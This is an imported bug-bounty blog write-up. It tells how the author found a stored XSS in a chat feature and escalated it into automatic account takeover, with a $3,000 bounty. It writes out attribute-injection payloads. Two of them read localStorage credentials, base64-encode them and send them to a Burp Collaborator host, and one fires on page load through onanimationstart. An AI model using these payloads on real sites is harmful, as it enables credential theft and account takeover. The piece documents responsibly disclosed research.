---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-03-15_how-i-managed-to-trigger-xss-automatically-to-get-critical-account-takeover.md
original_filename: 2022-03-15_how-i-managed-to-trigger-xss-automatically-to-get-critical-account-takeover.md
title: How I managed to trigger XSS automatically to get critical account takeover
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 15f28044dbf604022c2b3a62de23ee1c50eeca2b3555e8b7951f287975d5d21f
text_sha256: 66f165bfb6a5e9d6e7c396927eab435dfcacc1b93e81f5d3b065f8ffe4ca73fc
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# How I managed to trigger XSS automatically to get critical account takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-03-15_how-i-managed-to-trigger-xss-automatically-to-get-critical-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `15f28044dbf604022c2b3a62de23ee1c50eeca2b3555e8b7951f287975d5d21f`
- Text SHA256: `66f165bfb6a5e9d6e7c396927eab435dfcacc1b93e81f5d3b065f8ffe4ca73fc`


## Content

---
title: "How I managed to trigger XSS automatically to get critical account takeover"
url: "https://c4rrilat0r.medium.com/how-i-managed-to-trigger-xss-automatically-to-get-critical-account-takeover-92ea3abcaf9"
authors: ["c4rrilat0r (@c4rrilat0r)"]
bugs: ["Stored XSS"]
bounty: "3,000"
publication_date: "2022-03-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2816
scraped_via: "browseros"
---

# How I managed to trigger XSS automatically to get critical account takeover

How I managed to trigger XSS automatically to get critical account takeover
c4rrilat0r
Follow
3 min read
·
Mar 15, 2022

262

5

Hello everybody! This is my first medium post so I hope you like it.

This write up is about one of the best findings I ever had in HackerOne. The impact was critical because the XSS was stored and you could send it through a chat to any user leading to steal their credentials. So, let’s go!

This private program that we are going to call REDACTED.com has a chat to communicate with any user on the platform. Analyzing this feature I found that Javascript was parsing the URLs that I sent.

If I sent https://google.com, the chat parsed the text and it put the URL as a link in a “a” html tag:

So the first malicious payload that I sent was:

https://google.com"'/>

And boom I saw how the HTML was broken:

Broken HTML

Knowing this I tried to add new tags but unfortunately there were a lot of filters of html tags. After a while trying to add tags without success I started to add attributes on the “a” tag that allowed me to execute Javascript in the tag’s context.

In this part I hadn’t problems and I injected successfully an onclick=alert(1) a
attribute with the following payload:

https://google.com"onclick="alert('1')"a="

having as result the following final tag:

<a href="https://google.com" onclick="alert(1)" a=""> 

And when the victim clicked the link the popup alert appeared.

IMPORTANT INFORMATION: User’s credentials are saved on localStorage, an attacker can steal them with the following javascript payload:

https://google.com"onclick="b=JSON.stringify(localStorage);c=btoa(b);i=new/**/Image;i.src='https://burpcollaborator.burpcollaborator.net?t='+c"a="

To explain the payload above the javascript encodes the localStorage information in base64 and after that It send it to an attacker’s burp collaborator .

Get c4rrilat0r’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

At this moment I have got a high severity vulnerability because I could take over any account but with user interaction.

As I wanted a critical vulnerability I started to research how to trigger the Javascript payload automatically. After a while I found one perfect solution using the Cross-Site Scripting Cheat Sheet from Port Swigger. I found that the following payload works on all browser without user interaction:

Press enter or click to view image in full size

But the big problem was that I couldn’t inject new HTML tags to create the animation on ‘style’ tag.

How did I solve this problem?

I needed to find only one animation defined on REDACTED CSS. So I opened each of the CSS files loaded in site and I FOUND IT!

Press enter or click to view image in full size
REDACTED CSS

Now only I had to prepare the exploit:

https://google.com"onanimationstart="b=JSON.stringify(localStorage);c=btoa(b);i=new/**/Image;i.src=’https://burpcollaborator.burpcollaborator.net?t='+c"style="animation-name:Toastify__bounceOutRight

where:

I put the malicious javascript code on the onanimationstart attribute.
I defined in tag’s style the animation found.

So when the attacker sends the malicious message through the chat and the victim opens it, the tag’s style is loaded, the event executes the code put in the onanimationstart attribute and automatically the attacker receives the victim’s credentials on their burp collaborator.

Press enter or click to view image in full size

After testing it a lot I wrote the report and I submitted it.

The report was triaged in 2 days and resolved in 7 days with a 3000$ bounty.

Thanks for reading I hope this helps!

You can following me on twitter: https://twitter.com/c4rrilat0r.
